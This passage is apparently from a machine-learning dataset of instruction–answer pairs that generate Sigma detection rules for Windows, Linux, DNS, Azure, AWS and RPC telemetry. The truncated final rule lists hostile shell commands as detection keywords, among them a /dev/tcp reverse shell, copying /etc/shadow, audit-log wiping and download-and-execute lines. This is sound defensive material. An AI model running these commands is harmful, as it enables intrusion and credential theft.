'ZABpAHMAYQBiAGwAZQBiAGwAbwBjAGsAYQB0AGYAaQByAHMAdABzAGUAZQBuACAA'\n            - 'QAaQBzAGEAYgBsAGUAYgBsAG8AYwBrAGEAdABmAGkAcgBzAHQAcwBlAGUAbgAgA'\n            - 'kAGkAcwBhAGIAbABlAGIAbABvAGMAawBhAHQAZgBpAHIAcwB0AHMAZQBlAG4AIA'\n    condition: all of selection* or encoded_command\nfalsepositives:\n    - Possible Admin Activity\n    - Other Cmdlets that may use the same parameters\nlevel: high\n",
      "question": "requests to disable Microsoft Defender features using PowerShell commands",
      "answer": "In order to detect requests to disable Microsoft Defender features using PowerShell commands, you should monitor Windows process creation logs for specific command-line patterns. Focus on detecting instances where PowerShell commands such as 'Add-MpPreference' or 'Set-MpPreference' are used alongside options that aim to disable various Microsoft Defender safeguards. These include disabling real-time monitoring, input/output antivirus protection, behavior monitoring, and the \"block at first seen\" feature. Additionally, watch out for command lines containing '$true' or ' 1 ' which are indicative of enabling these disablement options.\n\nIt is also important to monitor for base64 encoded PowerShell commands that attempt to accomplish the same goals, as attackers may use encoding to evade detection. The presence of any part of these command sequences in the process creation logs, whether in plain text or base64 encoded, can be a strong indicator of an attack attempting to weaken the host's defenses.\n\nHowever, it must be noted that these PowerShell commands can also be used by system administrators for legitimate configurations. Therefore, identifying a true positive would involve context analysis beyond the mere detection of these commands to delineate between malicious activity and valid administrative tasks. The detection of these activities is considered critical due to their potential to significantly lower the defenses of the monitored system against malware and other threats."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting DNS-answer with TTL <10..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect DNS-answer with TTL <10, you should: monitor DNS logs for responses that have a TTL (Time to Live) less than 10 seconds, which can indicate suspicious or malicious activity. Specifically, focus on responses where any answer is provided (indicating a successful query response) and the TTL value for the response is greater than 0 but less than 10 seconds. Additionally, it is important to observe the rate at which these responses occur; if more than 3 such responses are identified coming from the same source IP address within a 30-second window, it warrants attention. The detection of such activity is considered to be of medium severity and aligns with tactics and techniques that involve the exploitation of DNS for command and control or other malicious purposes.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: dns\ndetection:\n    selection:\n        answer: '*'\n    filter1:\n        ttl: '>0'\n    filter2:\n        ttl: '<10'\n    timeframe: 30s\n    condition: selection and filter1 and filter2 | count(answer) by src_ip > 3\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: dns\ndetection:\n    selection:\n        answer: '*'\n    filter1:\n        ttl: '>0'\n    filter2:\n        ttl: '<10'\n    timeframe: 30s\n    condition: selection and filter1 and filter2 | count(answer) by src_ip > 3\nlevel: medium\n",
      "question": "DNS-answer with TTL <10.",
      "answer": "In order to detect DNS-answer with TTL <10, you should: monitor DNS logs for responses that have a TTL (Time to Live) less than 10 seconds, which can indicate suspicious or malicious activity. Specifically, focus on responses where any answer is provided (indicating a successful query response) and the TTL value for the response is greater than 0 but less than 10 seconds. Additionally, it is important to observe the rate at which these responses occur; if more than 3 such responses are identified coming from the same source IP address within a 30-second window, it warrants attention. The detection of such activity is considered to be of medium severity and aligns with tactics and techniques that involve the exploitation of DNS for command and control or other malicious purposes."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Identifies IPs from which users grant access to other users on azure resources and alerts when a previously unseen source IP address is used..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to identify IPs from which users grant access to other users on Azure resources and alert when a previously unseen source IP address is used, you should monitor Azure Activity logs for any instances of role assignments being created or modified. Specifically, keep an eye out for events containing the keyword \"Microsoft.Authorization/roleAssignments/write\". This indicates that a user has been granted access to an Azure resource, which could potentially be a security concern if originating from an unfamiliar or unauthorized source IP. Bear in mind that legitimate adjustments to role assignments can trigger this alert, so it's important to differentiate between normal administrative behavior and potentially malicious actions. The security level for this type of activity is considered medium, implying that while not every instance is an immediate threat, unusual or unexpected occurrences should be investigated to ensure they are not indicative of a compromised account or insider threat.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: azure\n    service: azureactivity\ndetection:\n    keywords:\n        - Microsoft.Authorization/roleAssignments/write\n    condition: keywords\nfalsepositives:\n    - Valid change\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: azure\n    service: azureactivity\ndetection:\n    keywords:\n        - Microsoft.Authorization/roleAssignments/write\n    condition: keywords\nfalsepositives:\n    - Valid change\nlevel: medium\n",
      "question": "Identifies IPs from which users grant access to other users on azure resources and alerts when a previously unseen source IP address is used.",
      "answer": "In order to identify IPs from which users grant access to other users on Azure resources and alert when a previously unseen source IP address is used, you should monitor Azure Activity logs for any instances of role assignments being created or modified. Specifically, keep an eye out for events containing the keyword \"Microsoft.Authorization/roleAssignments/write\". This indicates that a user has been granted access to an Azure resource, which could potentially be a security concern if originating from an unfamiliar or unauthorized source IP. Bear in mind that legitimate adjustments to role assignments can trigger this alert, so it's important to differentiate between normal administrative behavior and potentially malicious actions. The security level for this type of activity is considered medium, implying that while not every instance is an immediate threat, unusual or unexpected occurrences should be investigated to ensure they are not indicative of a compromised account or insider threat."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect adversaries leveraging legitimate remote desktop and support software for establishing command and control channels on target systems within networks, you should monitor DNS query logs on Windows systems for queries that are directed to domain names associated with these remote access services. This includes a wide range of services such as TeamViewer, GoToAssist, LogMeIn, Ammyy Admin, NetSupport Manager RAT, Remote Utilities RAT, AnyDesk, Splashtop, Atera, VNC, RustDesk, Zoho Assist, JumpCloud, Kaseya, Bomgar (BeyondTrust), and others. \n\nDetection should focus on the end part of the domain queried (e.g., '.getgo.com', '.logmein.com', '.ammyy.com') to catch activity related to these services. Special attention should be given to RustDesk connectivity patterns, marked by domain queries ending with '.rustdesk.com' and starting with 'rs-'. This specific pattern can indicate an attempt to connect to RustDesk's infrastructure, which could signify malicious use of this remote desktop software.\n\nIt is also crucial to exclude web browser processes from detection to minimize false positives. These exclusions encompass a variety of popular web browsers like Brave, Chrome, Firefox, Internet Explorer, Maxthon, Edge, Opera, Safari, SeaMonkey, Vivaldi, and Whale, considering their executable paths to differentiate legitimate browsing access to these domains from suspicious activities. \n\nThis monitoring strategy helps in identifying unauthorized or malicious usage of widely trusted remote access tools, which adversaries might exploit to maintain persistence and control over compromised systems subtly. Identifying such connections can be crucial in detecting and preventing breaches that utilize these legitimate services for harmful purposes.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: dns_query\ndetection:\n    selection_name:\n        QueryName|endswith:\n            - '.getgo.com'\n            - '.logmein.com'\n            - '.ammyy.com'\n            - '.netsupportsoftware.com' # For NetSupport Manager RAT\n            - 'remoteutilities.com' # Usage of Remote Utilities RAT\n            - '.net.anydesk.com'\n            - 'api.playanext.com'\n            - '.relay.splashtop.com'\n            - '.api.splashtop.com'\n            - 'app.atera.com'\n            - '.agentreporting.atera.com'\n            - '.pubsub.atera.com'\n            - 'logmeincdn.http.internapcdn.net'\n            - 'logmein-gateway.com'\n            - 'client.teamviewer.com'\n            - 'integratedchat.teamviewer.com'\n            - 'static.remotepc.com'\n            - '.n-able.com'\n            - 'comserver.corporate.beanywhere.com'\n            - '.swi-rc.com'\n            - '.swi-tc.com'\n            - 'telemetry.servers.qetqo.com'\n            - 'relay.screenconnect.com'\n            - 'control.connectwise.com'\n            - 'express.gotoassist.com'\n            - 'authentication.logmeininc.com'\n            - '.services.vnc.com'\n            - '.tmate.io'\n            - 'api.parsec.app'\n            - 'parsecusercontent.com'\n            - 'remotedesktop-pa.googleapis.com'\n            - '.logmein-gateway.com'\n            - 'secure.logmeinrescue.com'\n            - 'join.zoho.com'\n            - 'assist.zoho.com'\n            - '.zohoassist.com'\n            - 'downloads.zohocdn.com'\n            - 'agent.jumpcloud.com'\n            - 'kickstart.jumpcloud.com'\n            - 'cdn.kaseya.net'\n            - 'relay.kaseya.net'\n            - 'license.bomgar.com'\n            - '.beyondtrustcloud.com'\n    selection_rustdesk:  # https://twitter.com/malmoeb/status/1668504345132822531?s=20 and https://www.adamsdesk.com/posts/rustdesk-not-connecting/ mention this pattern \n        QueryName|endswith: '.rustdesk.com'\n        QueryName|startswith: 'rs-'\n    # Exclude browsers for legitimate visits of the domains mentioned above\n    # Add missing browsers you use and exclude the ones you don't\n    filter_optional_brave:\n        Image|endswith: '\\brave.exe'\n    filter_optional_chrome:\n        Image:\n            - 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'\n            - 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe'\n    filter_optional_firefox:\n        Image:\n            - 'C:\\Program Files\\Mozilla Firefox\\firefox.exe'\n            - 'C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe'\n    filter_optional_ie:\n        Image:\n            - 'C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe'\n            - 'C:\\Program Files\\Internet Explorer\\iexplore.exe'\n    filter_optional_maxthon:\n        Image|endswith: '\\maxthon.exe'\n    filter_optional_edge_1:\n        - Image|startswith: 'C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\'\n        - Image|endswith: '\\WindowsApps\\MicrosoftEdge.exe'\n        - Image:\n            - 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'\n            - 'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe'\n    filter_optional_edge_2:\n        Image|startswith:\n            - 'C:\\Program Files (x86)\\Microsoft\\EdgeCore\\'\n            - 'C:\\Program Files\\Microsoft\\EdgeCore\\'\n        Image|endswith:\n            - '\\msedge.exe'\n            - '\\msedgewebview2.exe'\n    filter_optional_opera:\n        Image|endswith: '\\opera.exe'\n    filter_optional_safari:\n        Image|endswith: '\\safari.exe'\n    filter_optional_seamonkey:\n        Image|endswith: '\\seamonkey.exe'\n    filter_optional_vivaldi:\n        Image|endswith: '\\vivaldi.exe'\n    filter_optional_whale:\n        Image|endswith: '\\whale.exe'\n    condition: 1 of selection_* and not 1 of filter_optional_*\nfalsepositives:\n    - Likely with other browser software\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: dns_query\ndetection:\n    selection_name:\n        QueryName|endswith:\n            - '.getgo.com'\n            - '.logmein.com'\n            - '.ammyy.com'\n            - '.netsupportsoftware.com' # For NetSupport Manager RAT\n            - 'remoteutilities.com' # Usage of Remote Utilities RAT\n            - '.net.anydesk.com'\n            - 'api.playanext.com'\n            - '.relay.splashtop.com'\n            - '.api.splashtop.com'\n            - 'app.atera.com'\n            - '.agentreporting.atera.com'\n            - '.pubsub.atera.com'\n            - 'logmeincdn.http.internapcdn.net'\n            - 'logmein-gateway.com'\n            - 'client.teamviewer.com'\n            - 'integratedchat.teamviewer.com'\n            - 'static.remotepc.com'\n            - '.n-able.com'\n            - 'comserver.corporate.beanywhere.com'\n            - '.swi-rc.com'\n            - '.swi-tc.com'\n            - 'telemetry.servers.qetqo.com'\n            - 'relay.screenconnect.com'\n            - 'control.connectwise.com'\n            - 'express.gotoassist.com'\n            - 'authentication.logmeininc.com'\n            - '.services.vnc.com'\n            - '.tmate.io'\n            - 'api.parsec.app'\n            - 'parsecusercontent.com'\n            - 'remotedesktop-pa.googleapis.com'\n            - '.logmein-gateway.com'\n            - 'secure.logmeinrescue.com'\n            - 'join.zoho.com'\n            - 'assist.zoho.com'\n            - '.zohoassist.com'\n            - 'downloads.zohocdn.com'\n            - 'agent.jumpcloud.com'\n            - 'kickstart.jumpcloud.com'\n            - 'cdn.kaseya.net'\n            - 'relay.kaseya.net'\n            - 'license.bomgar.com'\n            - '.beyondtrustcloud.com'\n    selection_rustdesk:  # https://twitter.com/malmoeb/status/1668504345132822531?s=20 and https://www.adamsdesk.com/posts/rustdesk-not-connecting/ mention this pattern \n        QueryName|endswith: '.rustdesk.com'\n        QueryName|startswith: 'rs-'\n    # Exclude browsers for legitimate visits of the domains mentioned above\n    # Add missing browsers you use and exclude the ones you don't\n    filter_optional_brave:\n        Image|endswith: '\\brave.exe'\n    filter_optional_chrome:\n        Image:\n            - 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'\n            - 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe'\n    filter_optional_firefox:\n        Image:\n            - 'C:\\Program Files\\Mozilla Firefox\\firefox.exe'\n            - 'C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe'\n    filter_optional_ie:\n        Image:\n            - 'C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe'\n            - 'C:\\Program Files\\Internet Explorer\\iexplore.exe'\n    filter_optional_maxthon:\n        Image|endswith: '\\maxthon.exe'\n    filter_optional_edge_1:\n        - Image|startswith: 'C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\'\n        - Image|endswith: '\\WindowsApps\\MicrosoftEdge.exe'\n        - Image:\n            - 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'\n            - 'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe'\n    filter_optional_edge_2:\n        Image|startswith:\n            - 'C:\\Program Files (x86)\\Microsoft\\EdgeCore\\'\n            - 'C:\\Program Files\\Microsoft\\EdgeCore\\'\n        Image|endswith:\n            - '\\msedge.exe'\n            - '\\msedgewebview2.exe'\n    filter_optional_opera:\n        Image|endswith: '\\opera.exe'\n    filter_optional_safari:\n        Image|endswith: '\\safari.exe'\n    filter_optional_seamonkey:\n        Image|endswith: '\\seamonkey.exe'\n    filter_optional_vivaldi:\n        Image|endswith: '\\vivaldi.exe'\n    filter_optional_whale:\n        Image|endswith: '\\whale.exe'\n    condition: 1 of selection_* and not 1 of filter_optional_*\nfalsepositives:\n    - Likely with other browser software\nlevel: medium\n",
      "question": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n",
      "answer": "In order to detect adversaries leveraging legitimate remote desktop and support software for establishing command and control channels on target systems within networks, you should monitor DNS query logs on Windows systems for queries that are directed to domain names associated with these remote access services. This includes a wide range of services such as TeamViewer, GoToAssist, LogMeIn, Ammyy Admin, NetSupport Manager RAT, Remote Utilities RAT, AnyDesk, Splashtop, Atera, VNC, RustDesk, Zoho Assist, JumpCloud, Kaseya, Bomgar (BeyondTrust), and others. \n\nDetection should focus on the end part of the domain queried (e.g., '.getgo.com', '.logmein.com', '.ammyy.com') to catch activity related to these services. Special attention should be given to RustDesk connectivity patterns, marked by domain queries ending with '.rustdesk.com' and starting with 'rs-'. This specific pattern can indicate an attempt to connect to RustDesk's infrastructure, which could signify malicious use of this remote desktop software.\n\nIt is also crucial to exclude web browser processes from detection to minimize false positives. These exclusions encompass a variety of popular web browsers like Brave, Chrome, Firefox, Internet Explorer, Maxthon, Edge, Opera, Safari, SeaMonkey, Vivaldi, and Whale, considering their executable paths to differentiate legitimate browsing access to these domains from suspicious activities. \n\nThis monitoring strategy helps in identifying unauthorized or malicious usage of widely trusted remote access tools, which adversaries might exploit to maintain persistence and control over compromised systems subtly. Identifying such connections can be crucial in detecting and preventing breaches that utilize these legitimate services for harmful purposes."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting an attacker trying to enable the outlook security setting \"EnableUnsafeClientMailRules\" which allows outlook to run applications or execute macros.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect an attacker trying to enable the outlook security setting \"EnableUnsafeClientMailRules\" which allows outlook to run applications or execute macros, you should: Monitor for process creation events within Windows systems for any instances where the command line contains the string '\\Outlook\\Security\\EnableUnsafeClientMailRules'. This string's presence suggests an attempt to alter Outlook's security settings to enable potentially unsafe client mail rules that could allow the execution of applications or macros, often used by attackers to perform malicious activities. It is important to consider any detection of this activity as high risk, although the possibility of false positives is acknowledged to be unknown.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: '\\Outlook\\Security\\EnableUnsafeClientMailRules'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: '\\Outlook\\Security\\EnableUnsafeClientMailRules'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "an attacker trying to enable the outlook security setting \"EnableUnsafeClientMailRules\" which allows outlook to run applications or execute macros",
      "answer": "In order to detect an attacker trying to enable the outlook security setting \"EnableUnsafeClientMailRules\" which allows outlook to run applications or execute macros, you should: Monitor for process creation events within Windows systems for any instances where the command line contains the string '\\Outlook\\Security\\EnableUnsafeClientMailRules'. This string's presence suggests an attempt to alter Outlook's security settings to enable potentially unsafe client mail rules that could allow the execution of applications or macros, often used by attackers to perform malicious activities. It is important to consider any detection of this activity as high risk, although the possibility of false positives is acknowledged to be unknown."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting svchost hosting RDP termsvcs communicating to target systems on TCP port 80 or 443.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect svchost hosting RDP termsvcs communicating to target systems on TCP port 80 or 443, you should: monitor network connections on Windows systems for specific patterns. Focus on connections where the process image ends with '\\svchost.exe', which is initiated by this service. Particularly, pay attention to instances where this process, acting as a host, initiates connections from source port 3389, which is traditionally used for remote desktop protocol (RDP) services, to destination ports 80 (commonly used for HTTP traffic) or 443 (used for HTTPS traffic). These connection attempts are unusual for svchost.exe involved in RDP activities, as they indicate possible misuse of RDP services to communicate with external systems over web ports, potentially for command and control or data exfiltration purposes. It's vital to consider all detections related to these patterns with a high level of suspicion due to the possibly unknown nature of false positives, indicating a critical need for immediate investigation upon detection.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\svchost.exe'\n        Initiated: 'true'\n        SourcePort: 3389\n        DestinationPort:\n            - 80\n            - 443\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\svchost.exe'\n        Initiated: 'true'\n        SourcePort: 3389\n        DestinationPort:\n            - 80\n            - 443\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "svchost hosting RDP termsvcs communicating to target systems on TCP port 80 or 443",
      "answer": "In order to detect svchost hosting RDP termsvcs communicating to target systems on TCP port 80 or 443, you should: monitor network connections on Windows systems for specific patterns. Focus on connections where the process image ends with '\\svchost.exe', which is initiated by this service. Particularly, pay attention to instances where this process, acting as a host, initiates connections from source port 3389, which is traditionally used for remote desktop protocol (RDP) services, to destination ports 80 (commonly used for HTTP traffic) or 443 (used for HTTPS traffic). These connection attempts are unusual for svchost.exe involved in RDP activities, as they indicate possible misuse of RDP services to communicate with external systems over web ports, potentially for command and control or data exfiltration purposes. It's vital to consider all detections related to these patterns with a high level of suspicion due to the possibly unknown nature of false positives, indicating a critical need for immediate investigation upon detection."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Identifies the suspicious use of GetSessionToken. Tokens could be created and used by attackers to move laterally and escalate privileges..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to identify the suspicious use of GetSessionToken, which could be created and used by attackers to move laterally and escalate privileges, you should focus on monitoring AWS CloudTrail logs. Specifically, look out for any use of the `GetSessionToken` action within these logs, which comes from the `eventSource` of `sts.amazonaws.com`. It is crucial to pay attention to the instances where the user identity type involved in making these requests is an `IAMUser`. \n\nRecognizing legitimate from illegitimate use of `GetSessionToken` could be somewhat challenging, as system or network administrators may use this action for routine tasks. To minimize false positives, closely examine whether the user identity, user agent, and/or hostname involved in these actions are expected to perform such operations within your environment. Activities performed by unfamiliar users or from unexpected hosts attempting to get a session token should be investigated thoroughly. Known legitimate behavior that frequently triggers this alert might need to be exempted to avoid unnecessary noise in your monitoring system.\n\nBy keeping an eye on these specific log entries and filtering activities based on the given criteria, you can flag potential security incidents. This proactive approach is based on well-recognized tactics and techniques, including lateral movement and privilege escalation, and aims to safeguard your AWS environment against unauthorized access and potential compromise.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection:\n        eventSource: sts.amazonaws.com\n        eventName: GetSessionToken\n        userIdentity.type: IAMUser\n    condition: selection\nfalsepositives:\n    - GetSessionToken may be done by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. GetSessionToken from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection:\n        eventSource: sts.amazonaws.com\n        eventName: GetSessionToken\n        userIdentity.type: IAMUser\n    condition: selection\nfalsepositives:\n    - GetSessionToken may be done by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. GetSessionToken from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: low\n",
      "question": "Identifies the suspicious use of GetSessionToken. Tokens could be created and used by attackers to move laterally and escalate privileges.",
      "answer": "In order to identify the suspicious use of GetSessionToken, which could be created and used by attackers to move laterally and escalate privileges, you should focus on monitoring AWS CloudTrail logs. Specifically, look out for any use of the `GetSessionToken` action within these logs, which comes from the `eventSource` of `sts.amazonaws.com`. It is crucial to pay attention to the instances where the user identity type involved in making these requests is an `IAMUser`. \n\nRecognizing legitimate from illegitimate use of `GetSessionToken` could be somewhat challenging, as system or network administrators may use this action for routine tasks. To minimize false positives, closely examine whether the user identity, user agent, and/or hostname involved in these actions are expected to perform such operations within your environment. Activities performed by unfamiliar users or from unexpected hosts attempting to get a session token should be investigated thoroughly. Known legitimate behavior that frequently triggers this alert might need to be exempted to avoid unnecessary noise in your monitoring system.\n\nBy keeping an eye on these specific log entries and filtering activities based on the given criteria, you can flag potential security incidents. This proactive approach is based on well-recognized tactics and techniques, including lateral movement and privilege escalation, and aims to safeguard your AWS environment against unauthorized access and potential compromise."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting remote RPC calls useb by SharpHound to map remote connections and local group membership..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect remote RPC calls used by SharpHound to map remote connections and local group membership, you should: Focus on analyzing logs from RPC Firewall, specifically those categorized under the application. Ensure that the RPC Firewall is installed and properly configured to audit and block RPC calls based on the configuration \"audit:true action:block uuid:6bffd098-a112-3610-9833-46c3f87e345a opnum:2\". The detection strategy revolves around monitoring for event logs tagged with \"RPCFW\", with an EventID of 3, which indicates an intercepted remote procedure call. Specifically, you are looking for any RPC calls that match the Interface UUID \"6bffd098-a112-3610-9833-46c3f87e345a\" and an operation number \"OpNum\" of 2. These parameters are indicative of the specific type of RPC call utilized by SharpHound in its reconnaissance activities. While analyzing these logs, it's important to be aware that false positives are unknown, indicating that each detection should be investigated thoroughly due to the high criticality of this activity. This approach is crucial in identifying and mitigating the tactics and techniques associated with the mapping of remote connections and the enumeration of local group memberships, typically involved in reconnaissance phases of cyber attacks.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: rpc_firewall\n    category: application\n    definition: 'Requirements: install and apply the RPC Firewall to all processes with \"audit:true action:block uuid:6bffd098-a112-3610-9833-46c3f87e345a opnum:2'\ndetection:\n    selection:\n        EventLog: RPCFW\n        EventID: 3\n        InterfaceUuid: 6bffd098-a112-3610-9833-46c3f87e345a\n        OpNum: 2\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: rpc_firewall\n    category: application\n    definition: 'Requirements: install and apply the RPC Firewall to all processes with \"audit:true action:block uuid:6bffd098-a112-3610-9833-46c3f87e345a opnum:2'\ndetection:\n    selection:\n        EventLog: RPCFW\n        EventID: 3\n        InterfaceUuid: 6bffd098-a112-3610-9833-46c3f87e345a\n        OpNum: 2\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "remote RPC calls useb by SharpHound to map remote connections and local group membership.",
      "answer": "In order to detect remote RPC calls used by SharpHound to map remote connections and local group membership, you should: Focus on analyzing logs from RPC Firewall, specifically those categorized under the application. Ensure that the RPC Firewall is installed and properly configured to audit and block RPC calls based on the configuration \"audit:true action:block uuid:6bffd098-a112-3610-9833-46c3f87e345a opnum:2\". The detection strategy revolves around monitoring for event logs tagged with \"RPCFW\", with an EventID of 3, which indicates an intercepted remote procedure call. Specifically, you are looking for any RPC calls that match the Interface UUID \"6bffd098-a112-3610-9833-46c3f87e345a\" and an operation number \"OpNum\" of 2. These parameters are indicative of the specific type of RPC call utilized by SharpHound in its reconnaissance activities. While analyzing these logs, it's important to be aware that false positives are unknown, indicating that each detection should be investigated thoroughly due to the high criticality of this activity. This approach is crucial in identifying and mitigating the tactics and techniques associated with the mapping of remote connections and the enumeration of local group memberships, typically involved in reconnaissance phases of cyber attacks."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious shell commands used in various Equation Group scripts and tools.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious shell commands used in various Equation Group scripts and tools, you should: Focus on monitoring Linux systems for specific command patterns that are indicative of malicious activity. These patterns include changing ownership to root and modifying file permissions to make them executable by anyone (e.g., using `chown root*chmod 4777`), copying the shell binary and changing its ownership (`cp /bin/sh .;chown`), modifying permissions and ownership in a temporary directory, especially involving suspiciously named binaries (like `/tmp/.scsi/dev/bin/gsh`), and employing unusual telnet commands to redirect console output to a shell or to set up reverse shells (e.g., `/bin/telnet locip locport < /dev/console | /bin/sh`). Look for the use of tools or scripts named or resembling Equation Group tools, such as `ewok`, `xspy`, `ghost_`, and attempts to wipe or hide network presence (`--wipe > /dev/null`) or manipulate system logs (clearing `/var/log/audit/audit.log`). Monitoring should also include spotting attempts to open backdoors or gain persistent access through modified file permissions on essential utilities or by downloading and executing files with permissions changes (e.g., `wget http*; chmod +x /tmp/sendmail`). It is crucial to watch for these commands in the Linux environment as their execution may indicate an attacker's attempt to establish persistence, escalate privileges, execute arbitrary commands, or exfiltrate data. While some commands might have legitimate uses, their context or combination can signal malicious intent, highlighting the importance of context-aware monitoring to minimize false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\ndetection:\n    keywords:\n        # evolvingstrategy, elgingamble, estesfox\n        - 'chown root*chmod 4777 '\n        - 'cp /bin/sh .;chown'\n        # tmpwatch\n        - 'chmod 4777 /tmp/.scsi/dev/bin/gsh'\n        - 'chown root:root /tmp/.scsi/dev/bin/'\n        # estesfox\n        - 'chown root:root x;'\n        # ratload\n        - '/bin/telnet locip locport < /dev/console | /bin/sh'\n        - '/tmp/ratload'\n        # ewok\n        - 'ewok -t '\n        # xspy\n        - 'xspy -display '\n        # elatedmonkey\n        - 'cat > /dev/tcp/127.0.0.1/80 <<END'\n        # ftshell\n        - 'rm -f /current/tmp/ftshell.latest'\n        # ghost\n        - 'ghost_* -v '\n        # morerats client\n        - ' --wipe > /dev/null'\n        # noclient\n        - 'ping -c 2 *; grep * /proc/net/arp >/tmp/gx'\n        - 'iptables * OUTPUT -p tcp -d 127.0.0.1 --tcp-flags RST RST -j DROP;'\n        # auditcleaner\n        - '> /var/log/audit/audit.log; rm -f .'\n        - 'cp /var/log/audit/audit.log .tmp'\n        # reverse shell\n        - 'sh >/dev/tcp/* <&1 2>&1'\n        # packrat\n        - 'ncat -vv -l -p * <'\n        - 'nc -vv -l -p * <'\n        # empty bowl\n        - '< /dev/console | uudecode && uncompress'\n        - 'sendmail -osendmail;chmod +x sendmail'\n        # echowrecker\n        - '/usr/bin/wget -O /tmp/a http* && chmod 755 /tmp/cron'\n        # dubmoat\n        - 'chmod 666 /var/run/utmp~'\n        # poptop\n        - 'chmod 700 nscd crond'\n        # abopscript\n        - 'cp /etc/shadow /tmp/.'\n        # ys\n        - '</dev/console |uudecode > /dev/null 2>&1 && uncompress'\n        # jacktelnet\n        - 'chmod 700 jp&&netstat -an|grep'\n        # others\n        - 'uudecode > /dev/null 2>&1 && uncompress -f * && chmod 755'\n        - 'chmod 700 crond'\n        - 'wget http*; chmod +x /tmp/sendmail'\n        - 'chmod 700 fp sendmail pt'\n        - 'chmod 755 /usr/vmsys/bin/pipe'\n        - 'chmod -R 755 /usr/vmsys'\n        - 'chmod 755 $opbin/*tunnel'\n        - 'chmod 700 sendmail'\n        - 